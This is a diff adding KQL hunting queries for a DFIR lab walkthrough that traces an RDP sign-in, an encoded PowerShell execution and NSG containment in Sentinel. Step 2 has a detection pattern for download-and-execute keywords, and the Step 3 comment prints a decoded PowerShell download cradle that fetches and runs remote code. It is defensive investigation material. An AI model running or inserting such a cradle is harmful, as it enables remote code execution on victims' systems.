@@ -1,0 +1,69 @@
+// Scenario 3 -- DFIR Investigation Walkthrough
+// Consolidated 4-step manual investigation query set.
+// See reports/scenario3-investigation-walkthrough.md for full narrative,
+// findings, and the reasoning behind each substitution/correction below.
+
+
+// ============================================================
+// STEP 1 -- Validate Initial Access
+// ============================================================
+// Original intent: SecurityEvent EventID 4624 (RDP logon). This table was
+// found empty in this environment (DCR scoped to Sysmon only -- see
+// docs/securityevent-dcr-gap.md). Substituted with Entra ID SigninLogs,
+// reusing the Scenario C detection's AppId to isolate the RDP-triggering
+// sign-in specifically.
+
+SigninLogs
+| where UserPrincipalName has "sjones"
+| where ResultType == "0"
+| where AppId == "38aa3b87-a06d-4817-b275-7a316988d93b"
+| where TimeGenerated > ago(24h)
+| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName
+
+
+// ============================================================
+// STEP 2 -- Isolate Payload Execution
+// ============================================================
+// Sysmon EventID 1, filtered to the encoded PowerShell pattern.
+// ActualUser extracted from payload-level EventData (not the unreliable
+// envelope-level UserName column -- see docs/envelope-vs-payload-user-field.md)
+
+Event
+| where TimeGenerated > ago(24h)
+| where Source == "Microsoft-Windows-Sysmon"
+| where EventID == 1
+| where EventData has "powershell.exe"
+| where EventData contains "-enc" or EventData has_any ("FromBase64String", "DownloadString", "IEX")
+| extend ActualUser = extract(@'<Data Name="User">([^<]+)</Data>', 1, EventData)
+| extend CommandLine = extract(@'<Data Name="CommandLine">([^<]+)</Data>', 1, EventData)
+| project TimeGenerated, Computer, ActualUser, CommandLine
+
+
+// ============================================================
+// STEP 3 -- Decode the Payload
+// ============================================================
+// No query -- manual base64 decode (UTF-16LE) of the CommandLine value
+// captured in Step 2. Decodes to:
+//
+//   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com...')
+//
+// A download cradle -- fetches and executes a remote payload in memory,
+// without writing to disk. Maps to MITRE T1059.001 and T1105.
+
+
+// ============================================================
+// STEP 4 -- Verify Containment
+// ============================================================
+// Attempted first via AzureActivity (NSG rule write operations).
+// Returned no results in testing -- possible ingestion delay or operation
+// name mismatch, not chased further. Containment was instead verified via
+// the Logic App's own run history (all 3 containment actions succeeded)
+// and direct behavioral confirmation (session dropped, reconnect blocked
+// except from whitelisted IP). Query included here for completeness /
+// future re-verification if desired.
+
+AzureActivity
+| where TimeGenerated > ago(24h)
+| where OperationNameValue == "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE"
+| where ActivityStatusValue == "Accept"
+| project TimeGenerated, Caller, OperationNameValue, ResourceGroup, Resource
